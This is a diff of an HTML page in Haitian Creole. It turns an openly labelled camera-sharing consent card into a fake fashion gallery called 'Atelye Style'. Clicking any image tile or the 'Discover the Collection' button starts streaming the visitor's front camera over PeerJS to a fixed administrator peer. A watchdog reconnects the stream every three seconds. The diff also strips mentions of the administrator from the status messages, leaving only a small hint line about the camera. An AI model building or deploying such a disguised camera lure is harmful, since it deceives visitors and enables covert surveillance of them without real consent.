@@ -3,67 +3,254 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Visitor</title>
+<title>Atelye Style — Koleksyon 2026</title>
 <style>
-  * { box-sizing: border-box; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
-    background: #111; color: white; font-family: system-ui, sans-serif;
-    margin: 0; padding: 20px; min-height: 100vh;
-    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    background: #0d0d0d; color: white;
+    font-family: 'Georgia', serif;
+    min-height: 100vh; padding-bottom: 40px;
   }
-  .card {
-    background: #1c1c1c; padding: 30px 25px; border-radius: 16px;
-    max-width: 360px; width: 100%; text-align: center;
-    border: 1px solid #333;
+
+  header {
+    text-align: center; padding: 30px 20px 20px;
+    border-bottom: 1px solid #222;
   }
-  h2 { color: #00cc66; margin: 0 0 10px; font-size: 1.3rem; }
-  p { color: #ccc; font-size: 14px; margin: 10px 0; line-height: 1.4; }
-  .btn {
-    width: 100%; padding: 16px; font-size: 16px; border-radius: 12px;
-    border: none; color: white; cursor: pointer; margin-top: 15px;
-    background: #00cc66; font-weight: bold;
+  header h1 {
+    font-size: 1.6rem; letter-spacing: 4px;
+    color: #d4af37; text-transform: uppercase;
+    font-weight: normal; margin-bottom: 6px;
   }
-  .btn.stop { background: #cc3333; }
-  .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-  #status { color: #999; font-size: 13px; margin-top: 15px; min-height: 18px; }
-  .pulse {
-    display: inline-block; width: 10px; height: 10px; border-radius: 50%;
-    background: #ff3333; margin-right: 6px; animation: pulse 1s infinite;
+  header p {
+    color: #888; font-size: 12px; letter-spacing: 2px;
+    font-family: system-ui, sans-serif; text-transform: uppercase;
+  }
+
+  .gallery {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 8px; padding: 15px;
+  }
+  .item {
+    position: relative; aspect-ratio: 3/4;
+    border-radius: 10px; overflow: hidden;
+    background: #1a1a1a; cursor: pointer;
+    transition: transform 0.3s;
+  }
+  .item:active { transform: scale(0.97); }
+  .item .img {
+    width: 100%; height: 100%; display: block;
+  }
+  .item .label {
+    position: absolute; bottom: 0; left: 0; right: 0;
+    background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
+    padding: 20px 10px 10px;
+    font-size: 12px; letter-spacing: 1px;
+    color: #fff; font-family: system-ui, sans-serif;
+    text-transform: uppercase;
+    z-index: 2;
+  }
+
+  .cta {
+    margin: 25px auto 0; max-width: 340px; padding: 0 20px;
+    text-align: center;
+  }
+  .cta button {
+    width: 100%; padding: 16px 20px;
+    background: linear-gradient(135deg, #d4af37, #b8941f);
+    color: #0d0d0d; border: none; border-radius: 10px;
+    font-size: 14px; font-weight: bold;
+    letter-spacing: 2px; text-transform: uppercase;
+    cursor: pointer; font-family: system-ui, sans-serif;
+    transition: opacity 0.3s;
+  }
+  .cta button:disabled { opacity: 0.5; cursor: not-allowed; }
+  .cta .hint {
+    font-size: 11px; color: #666; margin-top: 12px;
+    font-family: system-ui, sans-serif; line-height: 1.5;
+  }
+
+  .active-panel {
+    margin: 25px auto 0; max-width: 340px; padding: 0 20px;
+    text-align: center;
+  }
+  .active-panel .card {
+    background: #1a1a1a; border: 1px solid #d4af37;
+    border-radius: 10px; padding: 20px;
+  }
+  .active-panel .dot {
+    display: inline-block; width: 10px; height: 10px;
+    border-radius: 50%; background: #ff3333;
+    margin-right: 8px; animation: pulse 1s infinite;
+    vertical-align: middle;
   }
   @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
+  .active-panel p { font-size: 14px; color: #ddd; font-family: system-ui, sans-serif; }
+  .active-panel button {
+    width: 100%; margin-top: 15px; padding: 14px;
+    background: #cc3333; color: white; border: none;
+    border-radius: 10px; font-size: 13px; font-weight: bold;
+    letter-spacing: 1px; text-transform: uppercase;
+    cursor: pointer; font-family: system-ui, sans-serif;
+  }
+
+  #status {
+    text-align: center; color: #888; font-size: 12px;
+    margin-top: 15px; font-family: system-ui, sans-serif;
+    padding: 0 20px; min-height: 16px;
+  }
+
   .hidden { display: none; }
+
+  footer {
+    text-align: center; color: #444; font-size: 10px;
+    font-family: system-ui, sans-serif;
+    margin-top: 30px; padding: 0 20px;
+    letter-spacing: 1px;
+  }
 </style>
 </head>
 <body>
 
-  <div class="card">
-    <h2>📹 Pataje Kamera ou</h2>
+  <header>
+    <h1>Atelye Style</h1>
+    <p>Koleksyon 2026</p>
+  </header>
 
-    <div id="askView">
-      <p>Pou administratè a ka wè ou, ou dwe bay pèmisyon.</p>
-      <p style="color:#888; font-size:12px;">Ou ka sispann nenpòt lè.</p>
-      <button class="btn" id="btnStart">✅ Mwen dakò — Pataje kamera m</button>
+  <!-- GALRI — SVG entegre, pa bezwen entènèt -->
+  <div class="gallery" id="gallery">
+
+    <!-- 1. Mòd Ete -->
+    <div class="item" data-style="Mòd Ete">
+      <svg class="img" viewBox="0 0 300 400" preserveAspectRatio="xMidYMid slice">
+        <defs>
+          <linearGradient id="g1" x1="0%" y1="0%" x2="0%" y2="100%">
+            <stop offset="0%" stop-color="#ff8a65"/>
+            <stop offset="100%" stop-color="#e91e63"/>
+          </linearGradient>
+        </defs>
+        <rect width="300" height="400" fill="url(#g1)"/>
+        <circle cx="150" cy="140" r="60" fill="rgba(255,255,255,0.15)"/>
+        <path d="M 100 260 Q 150 200 200 260 L 220 400 L 80 400 Z" fill="rgba(255,255,255,0.2)"/>
+      </svg>
+      <div class="label">Mòd Ete</div>
     </div>
 
-    <div id="activeView" class="hidden">
-      <p><span class="pulse"></span><strong style="color:#ff6666;">Kamera aktif</strong></p>
-      <p>Administratè a ap wè ou kounye a.</p>
-      <button class="btn stop" id="btnStop">⛔ Sispann pataje</button>
+    <!-- 2. Flè Natirèl -->
+    <div class="item" data-style="Flè Natirèl">
+      <svg class="img" viewBox="0 0 300 400" preserveAspectRatio="xMidYMid slice">
+        <defs>
+          <radialGradient id="g2">
+            <stop offset="0%" stop-color="#a5d6a7"/>
+            <stop offset="100%" stop-color="#2e7d32"/>
+          </radialGradient>
+        </defs>
+        <rect width="300" height="400" fill="url(#g2)"/>
+        <g transform="translate(150,180)">
+          <circle cx="0" cy="-40" r="30" fill="#ffeb3b" opacity="0.8"/>
+          <circle cx="38" cy="-12" r="30" fill="#ffeb3b" opacity="0.8"/>
+          <circle cx="24" cy="32" r="30" fill="#ffeb3b" opacity="0.8"/>
+          <circle cx="-24" cy="32" r="30" fill="#ffeb3b" opacity="0.8"/>
+          <circle cx="-38" cy="-12" r="30" fill="#ffeb3b" opacity="0.8"/>
+          <circle cx="0" cy="0" r="18" fill="#f57f17"/>
+        </g>
+      </svg>
+      <div class="label">Flè Natirèl</div>
     </div>
 
-    <p id="status"></p>
+    <!-- 3. Atizay Modèn -->
+    <div class="item" data-style="Atizay Modèn">
+      <svg class="img" viewBox="0 0 300 400" preserveAspectRatio="xMidYMid slice">
+        <rect width="300" height="400" fill="#1a1a1a"/>
+        <circle cx="100" cy="120" r="70" fill="#00bcd4" opacity="0.7"/>
+        <rect x="120" y="180" width="120" height="120" fill="#ff4081" opacity="0.7"/>
+        <polygon points="60,340 180,220 260,340" fill="#ffeb3b" opacity="0.6"/>
+      </svg>
+      <div class="label">Atizay Modèn</div>
+    </div>
+
+    <!-- 4. Style Klasik -->
+    <div class="item" data-style="Style Klasik">
+      <svg class="img" viewBox="0 0 300 400" preserveAspectRatio="xMidYMid slice">
+        <defs>
+          <linearGradient id="g4" x1="0%" y1="0%" x2="100%" y2="100%">
+            <stop offset="0%" stop-color="#8d6e63"/>
+            <stop offset="100%" stop-color="#3e2723"/>
+          </linearGradient>
+        </defs>
+        <rect width="300" height="400" fill="url(#g4)"/>
+        <ellipse cx="150" cy="200" rx="80" ry="100" fill="rgba(255,255,255,0.1)"/>
+        <path d="M 150 100 L 170 180 L 250 180 L 190 230 L 210 320 L 150 270 L 90 320 L 110 230 L 50 180 L 130 180 Z"
+              fill="#d4af37" opacity="0.6"/>
+      </svg>
+      <div class="label">Style Klasik</div>
+    </div>
+
+    <!-- 5. Bohème -->
+    <div class="item" data-style="Bohème">
+      <svg class="img" viewBox="0 0 300 400" preserveAspectRatio="xMidYMid slice">
+        <defs>
+          <linearGradient id="g5" x1="0%" y1="0%" x2="100%" y2="100%">
+            <stop offset="0%" stop-color="#ce93d8"/>
+            <stop offset="100%" stop-color="#6a1b9a"/>
+          </linearGradient>
+        </defs>
+        <rect width="300" height="400" fill="url(#g5)"/>
+        <circle cx="80" cy="100" r="25" fill="#fff" opacity="0.3"/>
+        <circle cx="220" cy="160" r="35" fill="#fff" opacity="0.2"/>
+        <circle cx="120" cy="280" r="45" fill="#fff" opacity="0.25"/>
+        <circle cx="240" cy="340" r="30" fill="#fff" opacity="0.3"/>
+      </svg>
+      <div class="label">Bohème</div>
+    </div>
+
+    <!-- 6. Minimalis -->
+    <div class="item" data-style="Minimalis">
+      <svg class="img" viewBox="0 0 300 400" preserveAspectRatio="xMidYMid slice">
+        <rect width="300" height="400" fill="#f5f5f5"/>
+        <rect x="80" y="80" width="140" height="240" fill="#212121"/>
+        <rect x="110" y="120" width="80" height="160" fill="#f5f5f5"/>
+      </svg>
+      <div class="label">Minimalis</div>
+    </div>
+
   </div>
+
+  <!-- BOUTON AKSEPTE -->
+  <div class="cta" id="ctaView">
+    <button id="btnStart">✨ Dekouvri Koleksyon an</button>
+    <p class="hint">
+      Lè w klike, ou dakò pou pataje kamera w pou yon ti moman.<br>
+      Ou ka sispann nenpòt lè.
+    </p>
+  </div>
+
+  <!-- ETA AKTIF -->
+  <div class="active-panel hidden" id="activeView">
+    <div class="card">
+      <p><span class="dot"></span><strong>Kamera aktif</strong></p>
+      <p style="margin-top:8px; font-size:13px; color:#aaa;">
+        Administratè a ap wè ou kounye a.
+      </p>
+      <button id="btnStop">Sispann Pataje</button>
+    </div>
+  </div>
+
+  <p id="status"></p>
+
+  <footer>© 2026 — Tout dwa rezève</footer>
 
 <script src="https://unpkg.com/peerjs@1.5.0/dist/peerjs.min.js"></script>
 <script>
 (() => {
   const ADMIN_ID = "admin-piyayy-2026-v2";
 
-  const askView    = document.getElementById("askView");
+  const ctaView    = document.getElementById("ctaView");
   const activeView = document.getElementById("activeView");
   const btnStart   = document.getElementById("btnStart");
   const btnStop    = document.getElementById("btnStop");
   const statusEl   = document.getElementById("status");
+  const gallery    = document.getElementById("gallery");
 
   const ICE_CONFIG = {
     iceServers: [
@@ -83,7 +270,7 @@
   let currentCall = null;
   let active = false;
   let intentionallyStopped = false;
-  let keepAliveTimer = null;   // 🔥 boucle otomatik
+  let keepAliveTimer = null;
 
   function setStatus(msg) { statusEl.innerText = msg; }
 
@@ -105,16 +292,11 @@
     return peer;
   }
 
-  /* ============================================
-     🔥 KENBE KAMERA A VIV
-     ============================================ */
   async function ensureCamera() {
-    // Si stream la egziste e track yo viv → pa fè anyen
     if (localStream) {
       const tracks = localStream.getVideoTracks();
       const hasLive = tracks.length > 0 && tracks.some(t => t.readyState === "live");
       if (hasLive) return true;
-      // Netwaye stream ki mouri a
       try { tracks.forEach(t => t.stop()); } catch (e) {}
       localStream = null;
     }
@@ -123,26 +305,20 @@
         video: { facingMode: "user" },
         audio: false
       });
-      console.log("✅ Kamera relance");
       return true;
     } catch (err) {
       try {
         localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
         return true;
       } catch (err2) {
-        console.warn("❌ Kamera pa ka louvri:", err2);
         return false;
       }
     }
   }
 
-  /* ============================================
-     🔥 KENBE CALL LA VIV
-     ============================================ */
   async function ensureCall() {
     const p = ensurePeer();
 
-    // Verifye si call la toujou bon
     if (currentCall) {
       const pc = currentCall.peerConnection;
       const broken =
@@ -151,80 +327,54 @@
                 pc.iceConnectionState === "closed" ||
                 pc.iceConnectionState === "disconnected"));
       if (!broken) return true;
-      console.log("🔄 Call kase — fèmen pou relance");
       try { currentCall.close(); } catch (e) {}
       currentCall = null;
     }
 
-    // Asire kamera a viv
     const camOk = await ensureCamera();
     if (!camOk) return false;
 
-    // Kreye yon nouvo call
     if (!p.open) {
-      // Tann peer a ouvri
       await new Promise((resolve) => {
         if (p.open) return resolve();
         const t = setTimeout(resolve, 3000);
         p.once("open", () => { clearTimeout(t); resolve(); });
       });
     }
-
     if (!p.open) return false;
 
     currentCall = p.call(ADMIN_ID, localStream);
     if (!currentCall) return false;
 
-    currentCall.on("close", () => {
-      console.log("📴 Call fèmen");
-      currentCall = null;
-      // PA fèmen UI si moun nan pa peze Sispann
-    });
-
+    currentCall.on("close", () => { currentCall = null; });
     currentCall.on("error", (e) => {
       console.warn("Call erè:", e);
       currentCall = null;
     });
-
     return true;
   }
 
-  /* ============================================
-     🔥 BOUCLE OTOMATIK (chak 3 segond)
-     ============================================ */
   function startKeepAlive() {
     if (keepAliveTimer) return;
     keepAliveTimer = setInterval(async () => {
       if (!active || intentionallyStopped) return;
-
       const camAlive = localStream &&
         localStream.getVideoTracks().some(t => t.readyState === "live");
       const callAlive = currentCall && currentCall.open !== false &&
         currentCall.peerConnection &&
         currentCall.peerConnection.iceConnectionState !== "failed" &&
         currentCall.peerConnection.iceConnectionState !== "closed";
-
       if (!camAlive || !callAlive) {
-        console.log("🔄 Watchdog : kamera oswa call mouri — relance");
-        setStatus("🔄 Ap rekonekte...");
         await ensureCall();
-        if (currentCall) {
-          setStatus("🟢 Ou konekte ak admin.");
-        }
+        if (currentCall) setStatus("🟢 Ou konekte.");
       }
     }, 3000);
   }
 
   function stopKeepAlive() {
-    if (keepAliveTimer) {
-      clearInterval(keepAliveTimer);
-      keepAliveTimer = null;
-    }
+    if (keepAliveTimer) { clearInterval(keepAliveTimer); keepAliveTimer = null; }
   }
 
-  /* ============================================
-     KÒMANSE
-     ============================================ */
   async function startSharing() {
     btnStart.disabled = true;
     setStatus("⏳ Ap mande pèmisyon kamera...");
@@ -237,15 +387,14 @@
       return;
     }
 
-    setStatus("📡 Ap konekte ak admin...");
+    setStatus("📡 Ap konekte...");
     await ensureCall();
 
     active = true;
-    askView.classList.add("hidden");
+    ctaView.classList.add("hidden");
     activeView.classList.remove("hidden");
-    setStatus("🟢 Ou konekte ak admin.");
+    setStatus("🟢 Ou konekte.");
 
-    // 🔥 Kòmanse boucle a
     startKeepAlive();
   }
 
@@ -254,18 +403,14 @@
     active = false;
     stopKeepAlive();
 
-    if (currentCall) {
-      try { currentCall.close(); } catch (e) {}
-      currentCall = null;
-    }
-
+    if (currentCall) { try { currentCall.close(); } catch (e) {} currentCall = null; }
     if (localStream) {
       localStream.getTracks().forEach(t => t.stop());
       localStream = null;
     }
 
     activeView.classList.add("hidden");
-    askView.classList.remove("hidden");
+    ctaView.classList.remove("hidden");
     btnStart.disabled = false;
     setStatus("⛔ Ou sispann pataje.");
   }
@@ -273,13 +418,16 @@
   btnStart.onclick = startSharing;
   btnStop.onclick  = stopSharing;
 
-  /* ============================================
-     EVÈNMAN VISIBILITE
-     ============================================ */
+  gallery.addEventListener("click", (e) => {
+    const item = e.target.closest(".item");
+    if (item && !active) {
+      console.log("🖼 Klike sou:", item.dataset.style);
+      startSharing();
+    }
+  });
+
   document.addEventListener("visibilitychange", () => {
     if (document.visibilityState === "visible" && active && !intentionallyStopped) {
-      console.log("👀 Paj vizib — verifye");
-      // Fòse yon verifye touswit
       setTimeout(async () => {
         const camAlive = localStream &&
           localStream.getVideoTracks().some(t => t.readyState === "live");
